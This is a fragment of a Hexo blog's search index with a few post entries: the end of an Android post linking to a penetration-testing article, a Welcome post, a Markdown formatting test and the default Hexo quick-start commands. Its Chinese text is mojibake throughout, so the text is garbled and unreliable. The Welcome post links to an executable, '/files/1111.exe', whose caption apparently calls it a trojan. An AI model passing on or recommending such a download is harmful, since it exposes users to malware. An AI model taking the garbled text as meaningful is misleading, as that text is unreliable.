href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">å¦‚æœæç¤ºè¯ä¹¦å®‰å…¨é—®é¢˜çœ‹è¿™é‡Œ</a></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome</title>
      <link href="2021/12/04/Welcome/"/>
      <url>2021/12/04/Welcome/</url>
      
        <content type="html"><![CDATA[<p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a href="/files/1111.exe">è¿™æ˜¯ä¸ªğŸ</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The first try</title>
      <link href="2020/12/17/The%20first%20try/"/>
      <url>2020/12/17/The%20first%20try/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h1><blockquote><p>å¼•ç”¨</p></blockquote><hr><p><em>æ–œä½“</em><br><strong>åŠ ç²—</strong></p><p>ï¼<a href="%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5">è¯´æ˜</a></p><p><a href="http://baidu.com/">ç™¾åº¦</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> i=<span class="hljs-string">&quot;ä»£ç å—&quot;</span><br></code></pre></td></tr></table></figure><ul><li>åˆ—è¡¨</li><li>åˆ—è¡¨</li></ul><ol><li>åˆ—è¡¨</li><li>åˆ—è¡¨</li></ol><table><thead><tr><th align="center">è¡¨å¤´</th><th align="left">è¡¨å¤´</th><th align="right">è¡¨å¤´</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">2</td><td align="right">3</td></tr></tbody></table><p><del>åˆ é™¤</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/16/hello-world/"/>
      <url>2020/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
